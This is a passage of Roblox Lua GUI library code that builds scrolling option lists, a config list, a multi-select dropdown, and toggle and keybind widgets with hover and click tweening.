									TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
									if first then first = false 
										TextLabel.TextColor3 = MainUIColor
										function MenuAccent(color)
											TextLabel.TextColor3 = MainUIColor
										end								
									end 

									Button.MouseButton1Down:Connect(function() 

										for i,v in pairs(Frame:GetChildren()) do 
											if v:IsA("TextButton") then 
												library:Tween(v.TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
											end 
										end 

										library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = MainUIColor}) 

										Element.value.Scroll = v 

										values[tabname][sectorname][text] = Element.value 
										callback(Element.value) 
									end) 
									Button.MouseEnter:Connect(function() 
										if Element.value.Scroll ~= v then 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = MainUIColor}) 
										end 
									end) 
									Button.MouseLeave:Connect(function() 
										if Element.value.Scroll ~= v then 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
										end 
									end) 
								end 

								function Element:SetValue(val) 
									Element.value = val 

									for i,v in pairs(Frame:GetChildren()) do 
										if v:IsA("TextButton") then 
											library:Tween(v.TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
										end 
									end 

									library:Tween(Frame[Element.value.Scroll].TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
									values[tabname][sectorname][text] = Element.value 
									callback(Element.value) 
								end 
								values[tabname][sectorname][text] = Element.value
								
								
								
								
								
								
								
								
								
								
								
								
								
								
							elseif type == "cfgtype" then 
							local amount = data.Amount or 6 
								Section.Size = Section.Size + C.UDIM2(0,0,0,amount * 16 + 8) 
								if data.alphabet then 
									C.TBLSORT(data.options, function(a,b) 
										return a < b 
									end) 
								end 
								Element.value = {Scroll = data.default and data.default.Scroll or data.options[1]}

								local Scroll = C.INST("Frame") 
								local Frame = C.INST("ScrollingFrame") 
								local UIListLayout = C.INST("UIListLayout") 

								Scroll.Name = "Scroll" 
								Scroll.Parent = Inner 
								Scroll.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Scroll.BackgroundTransparency = 1.000 
								Scroll.Position = C.UDIM2(0, 0, 00, 0) 
								Scroll.Size = C.UDIM2(1, 0, 0, amount * 16 + 8) 


								Frame.Name = "Frame" 
								Frame.Parent = Scroll --  
								Frame.Active = true 
								Frame.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Frame.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Frame.Position = C.UDIM2(0, 30, 0, 0) 
								Frame.Size = C.UDIM2(0, 175, 0, 16 * amount) 
								Frame.BottomImage = "http://www.roblox.com/asset/?id=6724808282" 
								Frame.CanvasSize = C.UDIM2(0, 0, 0, 0) 
								Frame.MidImage = "http://www.roblox.com/asset/?id=6724808282" 
								Frame.ScrollBarThickness = 4 
								Frame.TopImage = "http://www.roblox.com/asset/?id=6724808282" 
								Frame.AutomaticCanvasSize = "Y" 
								Frame.ScrollBarImageColor3 = MainUIColor 
function MenuAccent(color)
Frame.ScrollBarImageColor3 = color
end
								UIListLayout.Parent = Frame 
								UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
								UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 
								local first = true 
ConfigUpdateCfgList:Connect(function()
								for i,v in ipairs(data.options) do 
									local Button = C.INST("TextButton") 
									local TextLabel = C.INST("TextLabel") 

									Button.Name = v 
									Button.Parent = Frame 
									Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Button.BorderSizePixel = 0 
									Button.Position = C.UDIM2(0, 30, 0, 16) 
									Button.Size = C.UDIM2(1, 0, 0, 16) 
									Button.AutoButtonColor = false 
									Button.Font = Enum.Font.SourceSans 
									Button.Text = "" 
									Button.TextColor3 = C.COL3RGB(0, 0, 0) 
									Button.TextSize = 11.000

									TextLabel.Parent = Button 
									TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel.BackgroundTransparency = 1.000 
									TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
									TextLabel.Position = C.UDIM2(0, 4, 0, -1) 
									TextLabel.Size = C.UDIM2(1, 1, 1, 1) 
									TextLabel.Font = Enum.Font.Gotham 
									TextLabel.Text = v 
									TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel.TextSize = 11.000
									TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
									if first then first = false 
										TextLabel.TextColor3 = MainUIColor 
--[[function MenuAccent(color)
TextLabel.TextColor3 = color
end--]]
									end 
 ConfigUpdateCfgList2:Connect(function()
Button:Destroy()
TextLabel:Destroy()
end)
									Button.MouseButton1Down:Connect(function() 

										for i,v in pairs(Frame:GetChildren()) do 
											if v:IsA("TextButton") then 
												library:Tween(v.TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
											end 
										end 

										library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = MainUIColor}) 

										Element.value.Scroll = v 

										values[tabname][sectorname][text] = Element.value 
										callback(Element.value) 
									end) 
									Button.MouseEnter:Connect(function() 
										if Element.value.Scroll ~= v then 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = MainUIColor}) 
										end 
									end) 
									Button.MouseLeave:Connect(function() 
										if Element.value.Scroll ~= v then 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
										end 
									end) 
								end
end)
ConfigUpdateCfgList:Fire()

								function Element:SetValue(val) 
									Element.value = val 

									for i,v in pairs(Frame:GetChildren()) do 
										if v:IsA("TextButton") then 
											library:Tween(v.TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
										end 
									end 

									library:Tween(Frame[Element.value.Scroll].TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
									values[tabname][sectorname][text] = Element.value 
									callback(Element.value) 
								end 
								values[tabname][sectorname][text] = Element.value								
							elseif type == "Jumbobox" then 
								Section.Size = Section.Size + C.UDIM2(0,0,0,39) 
								Element.value = {Jumbobox = {}} 
								data.options = data.options or {} 

								local Dropdown = C.INST("Frame") 
								local Button = C.INST("TextButton") 
								local TextLabel = C.INST("TextLabel") 
								local Drop = C.INST("ScrollingFrame") 
								local Button_2 = C.INST("TextButton") 
								local TextLabel_2 = C.INST("TextLabel") 
								local UIListLayout = C.INST("UIListLayout") 
								local ImageLabel = C.INST("ImageLabel") 
								local TextLabel_3 = C.INST("TextLabel") 

								Dropdown.Name = "Dropdown" 
								Dropdown.Parent = Inner 
								Dropdown.BackgroundColor3 = C.COL3RGB(33, 35, 255) 
								Dropdown.BackgroundTransparency = 1.000 
								Dropdown.Position = C.UDIM2(0, 0, 0.255102038, 0) 
								Dropdown.Size = C.UDIM2(1, 0, 0, 39) 

								Button.Name = "Button" 
								Button.Parent = Dropdown 
								Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button.Position = C.UDIM2(0, 30, 0, 16) 
								Button.Size = C.UDIM2(0, 175, 0, 17) 
								Button.AutoButtonColor = false 
								Button.Font = Enum.Font.SourceSans 
								Button.Text = "" 
								Button.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button.TextSize = 11.000

								TextLabel.Parent = Button 
								TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel.BackgroundTransparency = 1.000 
								TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
								TextLabel.Position = C.UDIM2(0, 5, 0, 0) 
								TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
								TextLabel.Font = Enum.Font.Gotham 
								TextLabel.Text = "..." 
								TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel.TextSize = 11.000
								TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

								local abcd = TextLabel 

								Drop.Name = "Drop" 
								Drop.Parent = Button 
								Drop.Active = true 
								Drop.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Drop.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Drop.Position = C.UDIM2(0, 0, 1, 1) 
								Drop.Size = C.UDIM2(1, 0, 0, 20) 
								Drop.Visible = false 
								Drop.BottomImage = "http://www.roblox.com/asset/?id=6724808282" 
								Drop.CanvasSize = C.UDIM2(0, 0, 0, 0) 
								Drop.ScrollBarThickness = 4 
								Drop.TopImage = "http://www.roblox.com/asset/?id=6724808282" 
								Drop.MidImage = "http://www.roblox.com/asset/?id=6724808282" 
								--Drop.AutomaticCanvasSize = "Y" 
								for i,v in pairs(data.options) do 
									Drop.CanvasSize = Drop.CanvasSize + C.UDIM2(0, 0, 0, 17) 
								end 
								Drop.ZIndex = 5 
								Drop.ScrollBarImageColor3 = MainUIColor 

								UIListLayout.Parent = Drop 
								UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
								UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 

								values[tabname][sectorname][text] = Element.value 

								local num = #data.options 
								if num > 5 then 
									Drop.Size = C.UDIM2(1, 0, 0, 85) 
								else 
									Drop.Size = C.UDIM2(1, 0, 0, 17*num) 
								end 
								local first = true 

								local function updatetext() 
									local old = {} 
									for i,v in ipairs(data.options) do 
										if C.TBLFIND(Element.value.Jumbobox, v) then 
											C.INSERT(old, v) 
										else 
										end 
									end 
									local str = "" 


									if #old == 0 then 
										str = "..." 
									else 
										if #old == 1 then 
											str = old[1] 
										else 
											for i,v in ipairs(old) do 
												if i == 1 then 
													str = v 
												else 
													if i > 2 then 
														if i < 4 then 
															str = str..",  ..." 
														end 
													else 
														str = str..",  "..v 
													end 
												end 
											end 
										end 
									end 

									abcd.Text = str 
								end 
								for i,v in ipairs(data.options) do 
									do 
										local Button = C.INST("TextButton") 
										local TextLabel = C.INST("TextLabel") 

										Button.Name = v 
										Button.Parent = Drop 
										Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
										Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
										Button.Position = C.UDIM2(0, 30, 0, 16) 
										Button.Size = C.UDIM2(0, 175, 0, 17) 
										Button.AutoButtonColor = false 
										Button.Font = Enum.Font.SourceSans 
										Button.Text = "" 
										Button.TextColor3 = C.COL3RGB(0, 0, 0) 
										Button.TextSize = 11.000
										Button.BorderSizePixel = 0 
										Button.ZIndex = 6 

										TextLabel.Parent = Button 
										TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
										TextLabel.BackgroundTransparency = 1.000 
										TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
										TextLabel.Position = C.UDIM2(0, 5, 0, -1) 
										TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
										TextLabel.Font = Enum.Font.Gotham 
										TextLabel.Text = v 
										TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
										TextLabel.TextSize = 11.000
										TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
										TextLabel.ZIndex = 6 

										Button.MouseButton1Down:Connect(function() 
											if C.TBLFIND(Element.value.Jumbobox, v) then 
												for i,a in pairs(Element.value.Jumbobox) do 
													if a == v then 
														C.TBLREMOVE(Element.value.Jumbobox, i) 
													end 
												end 
												library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
											else 
												C.INSERT(Element.value.Jumbobox, v) 
												library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = MainUIColor}) 
											end 
											updatetext() 

											values[tabname][sectorname][text] = Element.value 
											callback(Element.value) 
										end) 
										Button.MouseEnter:Connect(function() 
											if not C.TBLFIND(Element.value.Jumbobox, v) then 
												library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = MainUIColor}) 
											end 
										end) 
										Button.MouseLeave:Connect(function() 
											if not C.TBLFIND(Element.value.Jumbobox, v) then 
												library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
											end 
										end) 

										first = false 
									end 
								end 
								function Element:SetValue(val) 
									Element.value = val 
									for i,v in pairs(Drop:GetChildren()) do 
										if v.Name ~= "UIListLayout" then 
											if C.TBLFIND(val.Jumbobox, v.Name) then 
												v.TextLabel.TextColor3 = MainUIColor 
											else 
												v.TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
											end 
										end 
									end 
									updatetext() 
									values[tabname][sectorname][text] = Element.value 
									callback(val) 
								end 
								if data.default then 
									Element:SetValue(data.default) 
								end 

								ImageLabel.Parent = Button 
								ImageLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								ImageLabel.BackgroundTransparency = 1.000 
								ImageLabel.Position = C.UDIM2(0, 165, 0, 6) 
								ImageLabel.Size = C.UDIM2(0, 6, 0, 4) 
								ImageLabel.Image = "http://www.roblox.com/asset/?id=6724771531" 

								TextLabel_3.Parent = Dropdown 
								TextLabel_3.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel_3.BackgroundTransparency = 1.000 
								TextLabel_3.Position = C.UDIM2(0, 32, 0, -1) 
								TextLabel_3.Size = C.UDIM2(0.111913361, 208, 0.382215232, 0) 
								TextLabel_3.Font = Enum.Font.Gotham 
								TextLabel_3.Text = text 
								TextLabel_3.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel_3.TextSize = 11.000
								TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left 

								Button.MouseButton1Down:Connect(function() 
									Drop.Visible = not Drop.Visible 
									if not Drop.Visible then 
										Drop.CanvasPosition = C.Vec2(0,0) 
									end 
								end) 
								local indrop = false 
								local ind = false 
								Drop.MouseEnter:Connect(function() 
									indrop = true 
								end) 
								Drop.MouseLeave:Connect(function() 
									indrop = false 
								end) 
								Button.MouseEnter:Connect(function() 
									ind = true 
								end) 
								Button.MouseLeave:Connect(function() 
									ind = false 
								end) 
								game:GetService("UserInputService").InputBegan:Connect(function(input) 
									if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 then 
										if Drop.Visible == true and not indrop and not ind then 
											Drop.Visible = false 
											Drop.CanvasPosition = C.Vec2(0,0) 
										end 
									end 
								end) 
							elseif type == "ToggleKeybind" then 
								Section.Size = Section.Size + C.UDIM2(0,0,0,16) 
								Element.value = {Toggle = data.default and data.default.Toggle or false, Key = data.default and data.default.Key or nil, Type = "Always", Active = true} 
								Element.value.Key = data.default and data.default.Key or nil
								local Toggle = C.INST("Frame") 
								local Button = C.INST("TextButton") 
								local Color = C.INST("Frame") 
								local TextLabel = C.INST("TextLabel") 

								Toggle.Name = "Toggle" 
								Toggle.Parent = Inner 
								Toggle.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Toggle.BackgroundTransparency = 1.000 
								Toggle.Size = C.UDIM2(1, 0, 0, 15) 

								Button.Name = "Button" 
								Button.Parent = Toggle 
								Button.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Button.BackgroundTransparency = 1.000 
								Button.Size = C.UDIM2(1, 0, 1, 0) 
								Button.Font = Enum.Font.SourceSans 
								Button.Text = "" 
								Button.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button.TextSize = 11.000

								Color.Name = "Color" 
								Color.Parent = Button 
								Color.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Color.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Color.Position = C.UDIM2(0, 15, 0.5, -5) 
								Color.Size = C.UDIM2(0, 8, 0, 8) 
								local binding = false 
								TextLabel.Parent = Button 
								TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel.BackgroundTransparency = 1.000 
								TextLabel.Position = C.UDIM2(0, 32, 0, -1) 
								TextLabel.Size = C.UDIM2(0.111913361, 208, 1, 0) 
								TextLabel.Font = Enum.Font.Gotham 
								TextLabel.Text = text 
								TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel.TextSize = 11.000
								TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

								local function update() 
									if Element.value.Toggle then 
										tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = MainUIColor}) 
										library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
									else 
										keybindremove(text, Element.value.Key) 
										tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = C.COL3RGB(46, 46, 46)}) 
										library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
									end 
									values[tabname][sectorname][text] = Element.value 
									callback(Element.value) 
								end 

								Button.MouseButton1Down:Connect(function() 
									if not binding then 
										Element.value.Toggle = not Element.value.Toggle 
										update() 
										if Element.value.Key ~= nil and Element.value.Toggle then 
											keybindadd(text, Element.value.Key) 
										end 
										values[tabname][sectorname][text] = Element.value 
										callback(Element.value) 
									end 
								end) 
								if data.default then 
									update() 
								end 
								values[tabname][sectorname][text] = Element.value 
								do 
									local Keybind = C.INST("TextButton") 
									local Frame = C.INST("Frame") 
									local Always = C.INST("TextButton") 
									local UIListLayout = C.INST("UIListLayout") 
									local Hold = C.INST("TextButton") 
									local Toggle = C.INST("TextButton") 
									local ButtonKey = C.INST('TextButton')

									Keybind.Name = "Keybind" 
									Keybind.Parent = Button 
									Keybind.BackgroundColor3 = C.COL3RGB(31, 31, 31) 
									Keybind.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Keybind.Position = C.UDIM2(0, 270, 0.5, -6) 
									Keybind.Text = data.default and data.default.Key or 'none'
									Keybind.Size = C.UDIM2(0, 43, 0, 12) 
									Keybind.Size = C.UDIM2(0,txt:GetTextSize("NONE", 14, Enum.Font.SourceSansSemibold, C.Vec2(700, 12)).X + 5,0, 12)
									Keybind.AutoButtonColor = false 
									Keybind.Font = Enum.Font.Gotham 
									Keybind.TextColor3 = C.COL3RGB(200, 200, 200) 
									Keybind.TextSize = 11.000
									Keybind.AnchorPoint = C.Vec2(1,0) 
									Keybind.ZIndex = 3 

									Frame.Parent = Keybind 
									Frame.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Frame.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Frame.Position = C.UDIM2(1, -49, 0, 1) 
									Frame.Size = C.UDIM2(0, 49, 0, 49) 
									Frame.Visible = false 
									Frame.ZIndex = 3 

									Always.Name = "Always" 
									Always.Parent = Frame 
									Always.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Always.BackgroundTransparency = 1.000 
									Always.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Always.Position = C.UDIM2(-3.03289485, 231, 0.115384616, -6) 
									Always.Size = C.UDIM2(1, 0, 0, 16) 
									Always.AutoButtonColor = false 
									Always.Font = Enum.Font.SourceSansBold 
									Always.Text = "Always" 
									Always.TextColor3 = C.COL3RGB(173, 24, 72) 
									Always.TextSize = 11.000
									Always.ZIndex = 3 

									UIListLayout.Parent = Frame 
									UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
									UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 

									Hold.Name = "Hold" 
									Hold.Parent = Frame 
									Hold.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Hold.BackgroundTransparency = 1.000 
									Hold.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Hold.Position = C.UDIM2(-3.03289485, 231, 0.115384616, -6) 
									Hold.Size = C.UDIM2(1, 0, 0, 16) 
									Hold.AutoButtonColor = false 
									Hold.Font = Enum.Font.Gotham 
									Hold.Text = "Hold" 
									Hold.TextColor3 = C.COL3RGB(200, 200, 200) 
									Hold.TextSize = 11.000
									Hold.ZIndex = 3 

									Toggle.Name = "Toggle" 
									Toggle.Parent = Frame 
									Toggle.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Toggle.BackgroundTransparency = 1.000 
									Toggle.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Toggle.Position = C.UDIM2(-3.03289485, 231, 0.115384616, -6) 
									Toggle.Size = C.UDIM2(1, 0, 0, 16) 
									Toggle.AutoButtonColor = false 
									Toggle.Font = Enum.Font.Gotham 
									Toggle.Text = "Toggle" 
									Toggle.TextColor3 = C.COL3RGB(200, 200, 200) 
									Toggle.TextSize = 11.000
									Toggle.ZIndex = 3 

									for _,button in pairs(Frame:GetChildren()) do 
										if button:IsA("TextButton") then 
											button.MouseButton1Down:Connect(function() 
												Element.value.Type = button.Text 
												Frame.Visible = false 
												if Element.value.Active ~= (Element.value.Type == "Always" and true or false) then 
													Element.value.Active = Element.value.Type == "Always" and true or false 
													callback(Element.value) 
												end 
												if button.Text == "Always" then 
													keybindremove(text, Element.value.Key) 
												end 
												for _,button in pairs(Frame:GetChildren()) do 
													if button:IsA("TextButton") and button.Text ~= Element.value.Type then 
														button.Font = Enum.Font.Gotham 
														library:Tween(button, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200,200,200)}) 
													end 
												end 
												button.Font = Enum.Font.SourceSansBold 
												button.TextColor3 = C.COL3RGB(173, 24, 74) 
												values[tabname][sectorname][text] = Element.value 
											end) 
											button.MouseEnter:Connect(function() 
												if Element.value.Type ~= button.Text then 
													library:Tween(button, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255,255,255)}) 
												end 
											end) 
											button.MouseLeave:Connect(function() 
												if Element.value.Type ~= button.Text then 
													library:Tween(button, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200,200,200)}) 
												end 
											end) 
										end 
									end 
									Keybind.MouseButton1Down:Connect(function() 
										if not binding then 
											wait() 
											binding = true
											Keybind.Text = "..." 
											Keybind.Size = C.UDIM2(0,txt:GetTextSize("...", 14, Enum.Font.Gotham, C.Vec2(700, 12)).X + 4,0, 12) 
										end 
									end) 
									Keybind.MouseButton2Down:Connect(function() 
										if not binding then 
											Frame.Visible = not Frame.Visible 
										end 
									end) 
									local Player = game.Players.LocalPlayer 
									local Mouse = Player:GetMouse() 
									local InFrame = false 
									Frame.MouseEnter:Connect(function() 
										InFrame = true 
									end) 
									Frame.MouseLeave:Connect(function() 
										InFrame = false 
									end) 
									local InFrame2 = false 
									Keybind.MouseEnter:Connect(function() 
										InFrame2 = true 
									end) 
									Keybind.MouseLeave:Connect(function() 
										InFrame2 = false 
									end) 
									game:GetService("UserInputService").InputBegan:Connect(function(input) 
										if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 and not binding then 
											if Frame.Visible == true and not InFrame and not InFrame2 then 
												Frame.Visible = false 
											end 
										end 
										if binding then 
											binding = false 
											Keybind.Text = input.KeyCode.Name ~= "Unknown" and input.KeyCode.Name:upper() or input.UserInputType.Name:upper() 
											Keybind.Size = C.UDIM2(0,txt:GetTextSize(Keybind.Text, 14, Enum.Font.Gotham, C.Vec2(700, 12)).X + 5,0, 12) 
											Element.value.Key = input.KeyCode.Name ~= "Unknown" and input.KeyCode.Name or input.UserInputType.Name 
											if Element.value.Key ~= nil and Element.value.Toggle then 
												keybindadd(text, Element.value.Key) 
											end 
											if input.KeyCode.Name == "Backspace" then 
												Keybind.Text = "none" 
												Keybind.Size = C.UDIM2(0,txt:GetTextSize(Keybind.Text, 14, Enum.Font.Gotham, C.Vec2(700, 12)).X + 4,0, 12) 
												Element.value.Key = nil 
												Element.value.Active = true 
												keybindremove2(text)
											end 
											callback(Element.value) 
										else 
											if Element.value.Key ~= nil then 
												if C.FIND(Element.value.Key, "Mouse") then 
													if input.UserInputType == Enum.UserInputType[Element.value.Key] then 
														if Element.value.Type == "Hold" then 
															Element.value.Active = true 
															callback(Element.value) 
															if Element.value.Active and Element.value.Toggle then 
																keybindhold(text)
															else 
																keybindremove(text, Element.value.Key) 
															end 
														elseif Element.value.Type == "Toggle" then 
															Element.value.Active = not Element.value.Active 
															callback(Element.value) 
															if Element.value.Active and Element.value.Toggle then 
																keybindtoggle(text) 
															else 
																keybindremove(text, Element.value.Key) 
															end 
														end
													end 
												else 
													if input.KeyCode == Enum.KeyCode[Element.value.Key] then 
														if Element.value.Type == "Hold" then 
															Element.value.Active = true 
															callback(Element.value) 
															if Element.value.Active and Element.value.Toggle then 
																keybindhold(text)
															else 
																keybindremove(text, Element.value.Key) 
															end 
														elseif Element.value.Type == "Toggle" then 
															Element.value.Active = not Element.value.Active 
															callback(Element.value) 
															if Element.value.Active and Element.value.Toggle then 
																keybindtoggle(text) 
															else 
																keybindremove(text, Element.value.Key) 
															end
														end 
														
													end 
												end 
											else 
												Element.value.Active = true 
											end 
										end 
										values[tabname][sectorname][text] = Element.value 
									end) 
									game:GetService("UserInputService").InputEnded:Connect(function(input) 
										if Element.value.Key ~= nil then 
											if C.FIND(Element.value.Key, "Mouse") then 
												if input.UserInputType == Enum.UserInputType[Element.value.Key] then 
													if Element.value.Type == "Hold" then 
														Element.value.Active = false 
														callback(Element.value) 
														if Element.value.Active then 
															keybindhold(text)
														else 
															keybindremove(text, Element.value.Key) 
														end 
													end 
												end 
											else 
												if input.KeyCode == Enum.KeyCode[Element.value.Key] then 
													if Element.value.Type == "Hold" then 
														Element.value.Active = false 
														callback(Element.value) 
														if Element.value.Active then 
															keybindhold(text)
														else 
															keybindremove(text, Element.value.Key) 
														end 
													end 
												end 
											end 
										end 
										values[tabname][sectorname][text] = Element.value 
									end) 
								end 
								function Element:SetValue(value) 
									Element.value = value 
									update() 
									if Element.value.Toggle and Element.value.Key ~= nil then
										keybindadd(text, Element.value.Key)
									end
								end 
							elseif type == "Toggle" then 
								Section.Size = Section.Size + C.UDIM2(0,0,0,16) 
								Element.value = {Toggle = data.default and data.default.Toggle or false} 

								local Toggle = C.INST("Frame") 
								local Button = C.INST("TextButton") 
								local Color = C.INST("Frame") 
								local TextLabel = C.INST("TextLabel") 

								Toggle.Name = "Toggle" 
								Toggle.Parent = Inner 
								Toggle.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Toggle.BackgroundTransparency = 1.000 
								Toggle.Size = C.UDIM2(1, 0, 0, 15) 

								Button.Name = "Button" 
								Button.Parent = Toggle 
								Button.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Button.BackgroundTransparency = 1.000 
								Button.Size = C.UDIM2(1, 0, 1, 0) 
								Button.Font = Enum.Font.SourceSans 
								Button.Text = "" 
								Button.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button.TextSize = 11.000

								Color.Name = "Color" 
								Color.Parent = Button 
								
								Color.BackgroundColor3 = MainUIColor
	function MenuAccent(color)
Color.BackgroundColor3 = color
end						
								Color.BackgroundColor3 = C.COL3RGB(46, 46, 46)
								Color.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Color.Position = C.UDIM2(0, 15, 0.5, -5) 
								Color.Size = C.UDIM2(0, 8, 0, 8) 

								TextLabel.Parent = Button 
								TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel.BackgroundTransparency = 1.000 
								TextLabel.Position = C.UDIM2(0, 32, 0, -1) 
								TextLabel.Size = C.UDIM2(0.111913361, 208, 1, 0) 
								TextLabel.Font = Enum.Font.Gotham 
								TextLabel.Text = text 
								TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel.TextSize = 11.000
								TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

								local function update() 
									if Element.value.Toggle then 
										tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = MainUIColor}) 
										library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
									else 
										tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = C.COL3RGB(46, 46, 46)}) 
										library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
									end 
									values[tabname][sectorname][text] = Element.value 
								end 

								Button.MouseButton1Down:Connect(function() 
									Element.value.Toggle = not Element.value.Toggle 
									update() 
									values[tabname][sectorname][text] = Element.value 
									callback(Element.value) 
								end) 
								if data.default then 
									update() 
								end 
